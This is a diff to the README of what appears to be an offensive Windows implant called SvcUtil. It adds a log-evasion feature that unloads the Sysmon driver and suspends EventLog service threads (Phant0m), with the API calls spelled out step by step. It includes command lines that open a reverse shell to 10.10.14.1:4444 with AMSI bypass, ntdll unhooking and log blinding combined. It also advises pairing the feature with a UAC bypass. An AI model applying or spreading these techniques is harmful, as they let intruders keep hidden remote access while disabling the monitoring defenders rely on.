@@ -545,6 +545,25 @@ SvcUtil.exe -c 10.10.14.1 4444 --amsi --unhook
 
 The recommended order for maximum bypass: ntdll unhooking runs first (restores clean syscall stubs), then ETW patch + AMSI bypass apply on the clean ntdll.
 
+### --blind-log — Sysmon Evasion
+
+Combines two techniques to blind host-based logging:
+
+1. **FilterUnload SysmonDrv** — calls `fltlib.dll!FilterUnload("SysmonDrv")` to unload the Sysmon minifilter driver. Requires elevated privileges. Without its kernel driver, Sysmon stops receiving filesystem, registry, and process events.
+2. **Phant0m (EventLog thread suspension)** — locates the `svchost.exe` process hosting `wevtsvc.dll` (Windows Event Log service), enumerates its threads via `CreateToolhelp32Snapshot`, queries each thread's start address with `NtQueryInformationThread(ThreadQuerySetWin32StartAddress)`, and suspends every thread whose start address falls within `wevtsvc.dll`'s module range. The EventLog service remains "running" but cannot write any events.
+
+```bash
+# Shell mode — blind logging before spawning shell
+SvcUtil.exe -c 10.10.14.1 4444 --blind-log
+
+# Combined with all evasion flags
+SvcUtil.exe -c 10.10.14.1 4444 --amsi --unhook --blind-log
+```
+
+Execution order: `--blind-log` runs before payload execution or shell spawn, after argument parsing.
+
+> **Note:** FilterUnload requires high integrity (admin). Phant0m requires `SeDebugPrivilege` to open threads in the Event Log service process. In a UAC-enabled environment, use with a bypass or from an already-elevated context.
+
 ### Auto AMSI bypass (no flag needed)
 
 When `-e powershell.exe` is used, SvcUtil automatically applies AMSI/ETW bypass via stdin reflection — no `--amsi` flag needed. The `--amsi` flag adds the more advanced HW breakpoint technique on top.
@@ -575,6 +594,7 @@ When `-e powershell.exe` is used, SvcUtil automatically applies AMSI/ETW bypass 
 | `-i pid\|name` | Target for injection: PID or process name |
 | `--thread-inject` | Use thread injection instead of thread hijacking |
 | `--ppid pid\|name` | PPID spoofing: create child under specified parent |
+| `--blind-log` | Sysmon evasion: unload SysmonDrv + suspend EventLog threads |
 
 ---
 
@@ -598,6 +618,7 @@ Program.cs           Entry point, argument parsing, mode dispatch
 ├── Evasion
 │   ├── AmsiHwBp.cs        HW breakpoint AMSI bypass (VEH + DR0)
 │   ├── NtdllUnhook.cs     Ntdll .text section restore from disk
+│   ├── SvcHelper.cs       Sysmon evasion (FilterUnload + Phant0m EventLog suspension)
 │   └── Stager.cs          HTTP / named pipe payload staging
 │
 ├── Shellcode Mode
@@ -632,6 +653,8 @@ Program.cs           Entry point, argument parsing, mode dispatch
 | TLS Encryption | TlsStream.cs | Real TLS — traffic indistinguishable from HTTPS |
 | XOR String Obfuscation | All files | All sensitive strings stored as pre-computed XOR byte arrays |
 | Traffic Encryption | Crypto.cs | Rolling XOR cipher for network traffic |
+| Sysmon Driver Unload | SvcHelper.cs | `FilterUnload("SysmonDrv")` via D/Invoke — disables Sysmon kernel driver |
+| EventLog Blinding (Phant0m) | SvcHelper.cs | Suspend `wevtsvc.dll` threads in EventLog svchost — no events written |
 
 ## Changing Default Configuration
 
